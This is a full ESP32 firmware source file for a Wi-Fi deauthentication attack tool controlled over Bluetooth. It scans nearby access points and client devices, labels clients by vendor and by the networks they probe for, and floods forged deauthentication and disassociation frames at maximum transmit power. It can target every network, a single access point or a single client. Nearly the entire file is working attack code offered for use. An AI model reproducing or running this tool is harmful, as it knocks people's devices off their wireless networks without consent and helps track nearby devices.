/*
 * ESP32 Deauth — High-Power Precision + Accurate Client Scan
 * Bluetooth Serial control
 *
 * New:
 *   SCANSTA [seconds]  — focused client discovery (default 8s)
 *   Clients get vendor name from OUI + probe SSID when available
 *
 * Commands:
 *   SCAN | SCANSTA [sec]
 *   ATTACK ALL | ATTACK <BSSID>
 *   STA <MAC>
 *   STOP | STATUS
 *   CHANNEL <0-13> | RATE <1-128>
 *   REASON <code> | MODE DEAUTH|DISASSOC|BOTH
 *   HELP
 *
 * Pair: ESP32-DEAUTH  (Serial Bluetooth Terminal)
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include <BluetoothSerial.h>
#include <esp_bt.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>
#include <stdarg.h>
#include <ctype.h>
#include <string.h>

#define MAX_APS           64
#define MAX_CLIENTS       64
#define DEFAULT_RATE      32
#define MAX_RATE          128
#define SCAN_DWELL_MS     100
#define SCANSTA_DEFAULT_S 8
#define BT_NAME           "ESP32-DEAUTH"
#define HOP_MS            45
#define DEFAULT_REASON    0x07
#define TX_POWER_MAX      78
#define DEAUTH_TASK_STACK 6144
#define HOP_TASK_STACK    2048

struct APInfo {
  uint8_t  bssid[6];
  int8_t   rssi;
  uint8_t  channel;
  char     ssid[33];
  bool     active;
};

struct ClientInfo {
  uint8_t  mac[6];
  uint8_t  ap_bssid[6];
  int8_t   rssi;
  uint8_t  channel;
  char     name[24];   // vendor or probe SSID
  bool     active;
  uint16_t frames;     // how many times seen
};

BluetoothSerial SerialBT;

APInfo     aps[MAX_APS];
ClientInfo clients[MAX_CLIENTS];
uint8_t    ap_count     = 0;
uint8_t    client_count = 0;

volatile bool     attacking      = false;
volatile bool     attack_all     = false;
volatile bool     unicast_sta    = false;
volatile uint8_t  target_bssid[6] = {0};
volatile uint8_t  target_sta[6]   = {0};
volatile uint8_t  locked_channel  = 0;
volatile uint16_t packet_rate     = DEFAULT_RATE;
volatile uint8_t  reason_code     = DEFAULT_REASON;
volatile uint8_t  attack_mode     = 2;
volatile uint32_t packets_sent    = 0;
volatile uint32_t last_status_ms  = 0;

SemaphoreHandle_t ap_mutex;
TaskHandle_t      deauth_task_handle = NULL;
TaskHandle_t      hop_task_handle    = NULL;

static uint8_t frame_deauth[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, DEFAULT_REASON, 0x00
};

static uint8_t frame_disassoc[26] = {
  0xA0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, DEFAULT_REASON, 0x00
};

// Minimal OUI → short vendor name (common clients)
struct OuiEntry { uint8_t o[3]; const char *name; };
static const OuiEntry oui_table[] = {
  {{0x3C,0x22,0xFB}, "Apple"},
  {{0xF0,0xD1,0xA9}, "Apple"},
  {{0xA4,0x83,0xE7}, "Apple"},
  {{0xDC,0xA9,0x04}, "Apple"},
  {{0xF4,0x5C,0x89}, "Apple"},
  {{0x28,0x37,0x37}, "Apple"},
  {{0xAC,0xBC,0x32}, "Apple"},
  {{0x00,0x1A,0x11}, "Google"},
  {{0x3C,0x5A,0xB4}, "Google"},
  {{0x54,0x60,0x09}, "Google"},
  {{0xF4,0xF5,0xE8}, "Google"},
  {{0x94,0xEB,0x2C}, "Google"},
  {{0x78,0xF8,0x82}, "Xiaomi"},
  {{0x28,0x6C,0x07}, "Xiaomi"},
  {{0x64,0xCC,0x2E}, "Xiaomi"},
  {{0x50,0x64,0x2B}, "Xiaomi"},
  {{0x34,0xCE,0x00}, "Xiaomi"},
  {{0xFC,0x64,0xBA}, "Xiaomi"},
  {{0xA0,0x86,0xC6}, "Xiaomi"},
  {{0x00,0x1D,0x0F}, "Samsung"},
  {{0x5C,0x0A,0x5B}, "Samsung"},
  {{0x8C,0x71,0xF8}, "Samsung"},
  {{0xC8,0xBA,0x94}, "Samsung"},
  {{0xF0,0xEE,0x7A}, "Samsung"},
  {{0x00,0x16,0x6C}, "Samsung"},
  {{0xAC,0x5A,0x14}, "Samsung"},
  {{0xB8,0x27,0xEB}, "RPi"},
  {{0xDC,0xA6,0x32}, "RPi"},
  {{0xE4,0x5F,0x01}, "RPi"},
  {{0x28,0xCD,0xC1}, "RPi"},
  {{0x00,0x50,0xF2}, "Microsoft"},
  {{0x00,0x15,0x5D}, "Microsoft"},
  {{0x7C,0x1E,0x52}, "Microsoft"},
  {{0x00,0x0C,0x29}, "VMware"},
  {{0x00,0x50,0x56}, "VMware"},
  {{0x08,0x00,0x27}, "VirtualBox"},
  {{0x52,0x54,0x00}, "QEMU"},
  {{0x00,0x1E,0xC2}, "Cisco"},
  {{0x00,0x26,0x0A}, "Cisco"},
  {{0xF8,0x66,0xF2}, "Cisco"},
  {{0x00,0x14,0x22}, "Dell"},
  {{0xD4,0xBE,0xD9}, "Dell"},
  {{0x18,0x66,0xDA}, "Dell"},
  {{0x00,0x1A,0x2B}, "Ayecom"},
  {{0x00,0xE0,0x4C}, "Realtek"},
  {{0x00,0xE0,0x4D}, "Realtek"},
  {{0x52,0x54,0x00}, "Virt"},
};
static const int oui_count = sizeof(oui_table) / sizeof(oui_table[0]);

static void lookup_vendor(const uint8_t *mac, char *out, size_t outlen) {
  for (int i = 0; i < oui_count; i++) {
    if (mac[0] == oui_table[i].o[0] &&
        mac[1] == oui_table[i].o[1] &&
        mac[2] == oui_table[i].o[2]) {
      strncpy(out, oui_table[i].name, outlen - 1);
      out[outlen - 1] = '\0';
      return;
    }
  }
  // fallback: short OUI hex
  snprintf(out, outlen, "%02X%02X%02X", mac[0], mac[1], mac[2]);
}

static inline void mac_to_str(const uint8_t *mac, char *buf) {
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static bool parse_mac(const char *str, uint8_t *out) {
  unsigned int b[6];
  if (sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X",
             &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
    return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
  return true;
}

static void bt_print(const char *msg) {
  SerialBT.println(msg);
  Serial.println(msg);
}

static void bt_printf(const char *fmt, ...) {
  char buf[220];
  va_list args;
  va_start(args, fmt);
  vsnprintf(buf, sizeof(buf), fmt, args);
  va_end(args);
  SerialBT.println(buf);
  Serial.println(buf);
}

static IRAM_ATTR void inject_pair(const uint8_t *bssid, const uint8_t *dst) {
  frame_deauth[24]   = reason_code;
  frame_disassoc[24] = reason_code;

  if (attack_mode == 0 || attack_mode == 2) {
    memcpy(&frame_deauth[4],  dst,   6);
    memcpy(&frame_deauth[10], bssid, 6);
    memcpy(&frame_deauth[16], bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, frame_deauth, 26, false);
    packets_sent++;
  }
  if (attack_mode == 1 || attack_mode == 2) {
    memcpy(&frame_disassoc[4],  dst,   6);
    memcpy(&frame_disassoc[10], bssid, 6);
    memcpy(&frame_disassoc[16], bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, frame_disassoc, 26, false);
    packets_sent++;
  }

  if (!(dst[0] & 0x01)) {
    if (attack_mode == 0 || attack_mode == 2) {
      memcpy(&frame_deauth[4],  bssid, 6);
      memcpy(&frame_deauth[10], dst,   6);
      memcpy(&frame_deauth[16], bssid, 6);
      esp_wifi_80211_tx(WIFI_IF_STA, frame_deauth, 26, false);
      packets_sent++;
    }
    if (attack_mode == 1 || attack_mode == 2) {
      memcpy(&frame_disassoc[4],  bssid, 6);
      memcpy(&frame_disassoc[10], dst,   6);
      memcpy(&frame_disassoc[16], bssid, 6);
      esp_wifi_80211_tx(WIFI_IF_STA, frame_disassoc, 26, false);
      packets_sent++;
    }
  }
}

// Extract SSID from tagged parameters (probe req / beacon)
static void extract_ssid(const uint8_t *tags, int remaining, char *out, size_t outlen) {
  out[0] = '\0';
  while (remaining > 2) {
    uint8_t tag = tags[0];
    uint8_t tlen = tags[1];
    if (tag == 0 && tlen > 0 && tlen < 33 && (size_t)tlen < outlen) {
      memcpy(out, &tags[2], tlen);
      out[tlen] = '\0';
      return;
    }
    tags += 2 + tlen;
    remaining -= 2 + tlen;
  }
}

static void IRAM_ATTR sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;

  uint8_t frame_type = payload[0] & 0x0C;
  uint8_t frame_sub  = (payload[0] & 0xF0) >> 4;
  int8_t  rssi = pkt->rx_ctrl.rssi;
  uint8_t ch   = pkt->rx_ctrl.channel;

  // ----- Beacon / Probe Response → AP -----
  if (frame_type == 0x00 && (frame_sub == 8 || frame_sub == 5)) {
    if (xSemaphoreTake(ap_mutex, 0) != pdTRUE) return;
    const uint8_t *bssid = &payload[16];
    int idx = -1;
    for (int i = 0; i < ap_count; i++) {
      if (memcmp(aps[i].bssid, bssid, 6) == 0) { idx = i; break; }
    }
    if (idx < 0 && ap_count < MAX_APS) {
      idx = ap_count++;
      memcpy(aps[idx].bssid, bssid, 6);
      aps[idx].ssid[0] = '\0';
      if (len > 36)
        extract_ssid(&payload[36], len - 36, aps[idx].ssid, sizeof(aps[idx].ssid));
    }
    if (idx >= 0) {
      aps[idx].rssi    = rssi;
      aps[idx].channel = ch;
      aps[idx].active  = true;
    }
    xSemaphoreGive(ap_mutex);
    return;
  }

  // ----- Probe Request (subtype 4) → client + optional SSID name -----
  if (frame_type == 0x00 && frame_sub == 4) {
    const uint8_t *sa = &payload[10];   // source = client
    if (sa[0] & 0x01) return;
    if (xSemaphoreTake(ap_mutex, 0) != pdTRUE) return;

    int cidx = -1;
    for (int i = 0; i < client_count; i++) {
      if (memcmp(clients[i].mac, sa, 6) == 0) { cidx = i; break; }
    }
    if (cidx < 0 && client_count < MAX_CLIENTS) {
      cidx = client_count++;
      memcpy(clients[cidx].mac, sa, 6);
      clients[cidx].ap_bssid[0] = 0;
      clients[cidx].name[0] = '\0';
      clients[cidx].frames = 0;
      lookup_vendor(sa, clients[cidx].name, sizeof(clients[cidx].name));
    }
    if (cidx >= 0) {
      clients[cidx].rssi    = rssi;
      clients[cidx].channel = ch;
      clients[cidx].active  = true;
      clients[cidx].frames++;
      // try pull SSID from probe (directed probe)
      if (len > 24) {
        char probe_ssid[33] = {0};
        extract_ssid(&payload[24], len - 24, probe_ssid, sizeof(probe_ssid));
        if (probe_ssid[0] && strcmp(clients[cidx].name, probe_ssid) != 0) {
          // prefer probe SSID as name if present (shows what network it's looking for)
          snprintf(clients[cidx].name, sizeof(clients[cidx].name), "%.20s", probe_ssid);
        }
      }
    }
    xSemaphoreGive(ap_mutex);
    return;
  }

  // ----- Data frames → associated client discovery -----
  if (frame_type == 0x08 && len >= 24) {
    const uint8_t *addr1 = &payload[4];
    const uint8_t *addr2 = &payload[10];
    uint8_t to_ds   = payload[1] & 0x01;
    uint8_t from_ds = (payload[1] & 0x02) >> 1;

    const uint8_t *sta   = NULL;
    const uint8_t *bssid = NULL;
    if (to_ds == 0 && from_ds == 1) {
      sta   = addr1;
      bssid = addr2;
    } else if (to_ds == 1 && from_ds == 0) {
      sta   = addr2;
      bssid = addr1;
    } else if (to_ds == 1 && from_ds == 1) {
      // WDS — skip
      return;
    }
    if (!sta || !bssid) return;
    if (sta[0] & 0x01) return;

    if (xSemaphoreTake(ap_mutex, 0) != pdTRUE) return;
    int cidx = -1;
    for (int i = 0; i < client_count; i++) {
      if (memcmp(clients[i].mac, sta, 6) == 0) { cidx = i; break; }
    }
    if (cidx < 0 && client_count < MAX_CLIENTS) {
      cidx = client_count++;
      memcpy(clients[cidx].mac, sta, 6);
      clients[cidx].name[0] = '\0';
      clients[cidx].frames = 0;
      lookup_vendor(sta, clients[cidx].name, sizeof(clients[cidx].name));
    }
    if (cidx >= 0) {
      memcpy(clients[cidx].ap_bssid, bssid, 6);
      clients[cidx].rssi    = rssi;
      clients[cidx].channel = ch;
      clients[cidx].active  = true;
      clients[cidx].frames++;
    }
    xSemaphoreGive(ap_mutex);
  }
}

void channel_hop_task(void *param) {
  uint8_t ch = 1;
  for (;;) {
    if (!attacking) {
      vTaskDelay(pdMS_TO_TICKS(150));
      continue;
    }
    if (locked_channel != 0) {
      esp_wifi_set_channel(locked_channel, WIFI_SECOND_CHAN_NONE);
      vTaskDelay(pdMS_TO_TICKS(HOP_MS));
      continue;
    }
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    ch++;
    if (ch > 13) ch = 1;
    vTaskDelay(pdMS_TO_TICKS(HOP_MS));
  }
}

void deauth_task(void *param) {
  const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t local_bssid[6];
  uint8_t local_sta[6];
  bool    local_all;
  bool    local_unicast;
  uint16_t rate;

  for (;;) {
    if (!attacking) {
      vTaskDelay(pdMS_TO_TICKS(40));
      continue;
    }

    local_all     = attack_all;
    local_unicast = unicast_sta;
    rate          = packet_rate;
    memcpy(local_bssid, (const void *)target_bssid, 6);
    memcpy(local_sta,   (const void *)target_sta,   6);

    if (xSemaphoreTake(ap_mutex, pdMS_TO_TICKS(8)) == pdTRUE) {
      if (local_unicast) {
        for (uint16_t n = 0; n < rate; n++)
          inject_pair(local_bssid, local_sta);
      }
      else if (local_all) {
        for (int i = 0; i < ap_count; i++) {
          if (!aps[i].active) continue;
          for (uint16_t n = 0; n < rate; n++) {
            inject_pair(aps[i].bssid, broadcast);
            for (int c = 0; c < client_count; c++) {
              if (clients[c].active &&
                  memcmp(clients[c].ap_bssid, aps[i].bssid, 6) == 0)
                inject_pair(aps[i].bssid, clients[c].mac);
            }
          }
        }
      }
      else {
        for (uint16_t n = 0; n < rate; n++) {
          inject_pair(local_bssid, broadcast);
          for (int c = 0; c < client_count; c++) {
            if (clients[c].active &&
                memcmp(clients[c].ap_bssid, local_bssid, 6) == 0)
              inject_pair(local_bssid, clients[c].mac);
          }
        }
      }
      xSemaphoreGive(ap_mutex);
    }
    vTaskDelay(pdMS_TO_TICKS(1));
  }
}

void do_scan() {
  bt_print("[*] SCAN APs + clients (1-13)...");
  bool was = attacking;
  attacking = false;
  vTaskDelay(pdMS_TO_TICKS(40));

  ap_count = 0;
  client_count = 0;
  memset(aps, 0, sizeof(aps));
  memset(clients, 0, sizeof(clients));

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_cb);

  for (uint8_t ch = 1; ch <= 13; ch++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(SCAN_DWELL_MS));
  }

  attacking = was;

  if (xSemaphoreTake(ap_mutex, pdMS_TO_TICKS(80)) == pdTRUE) {
    bt_printf("[+] %d APs, %d STAs", ap_count, client_count);
    for (int i = 0; i < ap_count; i++) {
      char mac[18];
      mac_to_str(aps[i].bssid, mac);
      bt_printf("  %2d ch:%2d rssi:%4d %s %s",
                i, aps[i].channel, aps[i].rssi, mac, aps[i].ssid);
    }
    for (int i = 0; i < client_count; i++) {
      char sm[18], am[18];
      mac_to_str(clients[i].mac, sm);
      mac_to_str(clients[i].ap_bssid, am);
      bt_printf("  STA %s [%s] -> %s ch:%d rssi:%d f:%u",
                sm, clients[i].name, am,
                clients[i].channel, clients[i].rssi, clients[i].frames);
    }
    xSemaphoreGive(ap_mutex);
  }
}

// Focused client scan — longer dwell, all channels, emphasize probe + data
void do_scansta(int seconds) {
  if (seconds < 2) seconds = 2;
  if (seconds > 30) seconds = 30;
  bt_printf("[*] SCANSTA %ds — deep client discovery...", seconds);

  bool was = attacking;
  attacking = false;
  vTaskDelay(pdMS_TO_TICKS(30));

  // keep existing APs, refresh clients
  client_count = 0;
  memset(clients, 0, sizeof(clients));

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_cb);

  uint32_t end = millis() + (uint32_t)seconds * 1000UL;
  uint8_t ch = 1;
  while (millis() < end) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(120));
    ch++;
    if (ch > 13) ch = 1;
  }

  attacking = was;

  if (xSemaphoreTake(ap_mutex, pdMS_TO_TICKS(80)) == pdTRUE) {
    bt_printf("[+] Clients found: %d", client_count);
    for (int i = 0; i < client_count; i++) {
      char sm[18], am[18];
      mac_to_str(clients[i].mac, sm);
      if (clients[i].ap_bssid[0] | clients[i].ap_bssid[1] |
          clients[i].ap_bssid[2] | clients[i].ap_bssid[3])
        mac_to_str(clients[i].ap_bssid, am);
      else
        strcpy(am, "--------");
      bt_printf("  %2d %s  name:%-12s  AP:%s  ch:%2d  rssi:%4d  frames:%u",
                i, sm, clients[i].name, am,
                clients[i].channel, clients[i].rssi, clients[i].frames);
    }
    xSemaphoreGive(ap_mutex);
  }
}

void handle_cmd(char *line) {
  while (*line == ' ' || *line == '\t') line++;
  char *end = line + strlen(line) - 1;
  while (end > line && (*end == '\r' || *end == '\n' || *end == ' ')) {
    *end = '\0';
    end--;
  }
  if (*line == '\0') return;

  char cmd[24] = {0};
  char arg[64] = {0};
  sscanf(line, "%23s %63s", cmd, arg);
  for (char *p = cmd; *p; p++) *p = toupper(*p);

  if (strcmp(cmd, "SCAN") == 0) {
    do_scan();
  }
  else if (strcmp(cmd, "SCANSTA") == 0) {
    int sec = arg[0] ? atoi(arg) : SCANSTA_DEFAULT_S;
    do_scansta(sec);
  }
  else if (strcmp(cmd, "ATTACK") == 0) {
    unicast_sta = false;
    if (strcmp(arg, "ALL") == 0 || arg[0] == '\0') {
      attack_all = true;
      attacking  = true;
      packets_sent = 0;
      locked_channel = 0;
      bt_print("[!] ATTACK ALL");
    } else {
      uint8_t mac[6];
      if (!parse_mac(arg, mac)) {
        bt_print("[-] Bad BSSID");
        return;
      }
      memcpy((void *)target_bssid, mac, 6);
      attack_all = false;
      attacking  = true;
      packets_sent = 0;
      locked_channel = 0;
      if (xSemaphoreTake(ap_mutex, pdMS_TO_TICKS(40)) == pdTRUE) {
        for (int i = 0; i < ap_count; i++) {
          if (memcmp(aps[i].bssid, mac, 6) == 0) {
            locked_channel = aps[i].channel;
            break;
          }
        }
        xSemaphoreGive(ap_mutex);
      }
      char m[18];
      mac_to_str(mac, m);
      bt_printf("[!] ATTACK %s ch=%d", m, locked_channel);
    }
  }
  else if (strcmp(cmd, "STA") == 0) {
    uint8_t mac[6];
    if (!parse_mac(arg, mac)) {
      bt_print("[-] Bad STA MAC");
      return;
    }
    bool has_ap = false;
    for (int i = 0; i < 6; i++) if (target_bssid[i]) has_ap = true;
    if (!has_ap) {
      bt_print("[-] ATTACK <BSSID> first, then STA <MAC>");
      return;
    }
    memcpy((void *)target_sta, mac, 6);
    unicast_sta = true;
    attack_all  = false;
    attacking   = true;
    packets_sent = 0;
    char m[18];
    mac_to_str(mac, m);
    bt_printf("[!] UNICAST STA %s", m);
  }
  else if (strcmp(cmd, "STOP") == 0) {
    attacking = false;
    unicast_sta = false;
    locked_channel = 0;
    bt_print("[*] Stopped");
  }
  else if (strcmp(cmd, "STATUS") == 0) {
    const char *mode_str = attack_mode == 0 ? "DEAUTH" :
                           attack_mode == 1 ? "DISASSOC" : "BOTH";
    bt_printf("[i] att=%d all=%d uni=%d rate=%u reason=%u mode=%s pkts=%lu ch=%d APs=%d STAs=%d",
              attacking, attack_all, unicast_sta, packet_rate, reason_code,
              mode_str, (unsigned long)packets_sent, locked_channel,
              ap_count, client_count);
  }
  else if (strcmp(cmd, "CHANNEL") == 0) {
    int ch = atoi(arg);
    if (ch < 0 || ch > 13) {
      bt_print("[-] 0-13");
      return;
    }
    locked_channel = (uint8_t)ch;
    if (ch > 0) esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    bt_printf("[*] Channel = %d", ch);
  }
  else if (strcmp(cmd, "RATE") == 0) {
    int r = atoi(arg);
    if (r < 1) r = 1;
    if (r > MAX_RATE) r = MAX_RATE;
    packet_rate = (uint16_t)r;
    bt_printf("[*] Rate = %u", packet_rate);
  }
  else if (strcmp(cmd, "REASON") == 0) {
    int r = atoi(arg);
    if (r < 1 || r > 99) r = DEFAULT_REASON;
    reason_code = (uint8_t)r;
    bt_printf("[*] Reason = %u", reason_code);
  }
  else if (strcmp(cmd, "MODE") == 0) {
    for (char *p = arg; *p; p++) *p = toupper(*p);
    if (strcmp(arg, "DEAUTH") == 0) {
      attack_mode = 0;
      bt_print("[*] Mode = DEAUTH");
    } else if (strcmp(arg, "DISASSOC") == 0) {
      attack_mode = 1;
      bt_print("[*] Mode = DISASSOC");
    } else if (strcmp(arg, "BOTH") == 0) {
      attack_mode = 2;
      bt_print("[*] Mode = BOTH");
    } else {
      bt_print("[-] MODE DEAUTH|DISASSOC|BOTH");
    }
  }
  else if (strcmp(cmd, "HELP") == 0) {
    bt_print("SCAN          AP + client overview");
    bt_print("SCANSTA [sec] deep client scan (default 8)");
    bt_print("ATTACK ALL | ATTACK <BSSID>");
    bt_print("STA <MAC>     unicast one client");
    bt_print("STOP | STATUS | CHANNEL | RATE | REASON | MODE");
  }
  else {
    bt_printf("[-] Unknown: %s", cmd);
  }
}

void setup() {
  Serial.begin(115200);
  delay(150);
  setCpuFrequencyMhz(240);

  if (!SerialBT.begin(BT_NAME))
    Serial.println("BT fail");
  else
    Serial.println("BT: " BT_NAME);

  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(true, true);
  delay(40);

  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_cb);
  esp_wifi_set_max_tx_power(TX_POWER_MAX);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  ap_mutex = xSemaphoreCreateMutex();

  xTaskCreatePinnedToCore(deauth_task, "deauth", DEAUTH_TASK_STACK, NULL, 3,
                          &deauth_task_handle, 1);
  xTaskCreatePinnedToCore(channel_hop_task, "hop", HOP_TASK_STACK, NULL, 2,
                          &hop_task_handle, 0);

  bt_print("========================================");
  bt_print(" ESP32 Deauth + Client Scan + Names");
  bt_print(" BT: " BT_NAME " | HELP");
  bt_print("========================================");
}

void loop() {
  static char line[100];
  static uint8_t idx = 0;

  while (SerialBT.available()) {
    char c = SerialBT.read();
    if (c == '\n' || c == '\r') {
      if (idx > 0) {
        line[idx] = '\0';
        handle_cmd(line);
        idx = 0;
      }
    } else if (idx < sizeof(line) - 1) {
      line[idx++] = c;
    }
  }
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      if (idx > 0) {
        line[idx] = '\0';
        handle_cmd(line);
        idx = 0;
      }
    } else if (idx < sizeof(line) - 1) {
      line[idx++] = c;
    }
  }

  if (attacking && (millis() - last_status_ms > 4000)) {
    last_status_ms = millis();
    bt_printf("[i] pkts=%lu rate=%u ch=%d",
              (unsigned long)packets_sent, packet_rate, locked_channel);
  }
  vTaskDelay(pdMS_TO_TICKS(4));
}
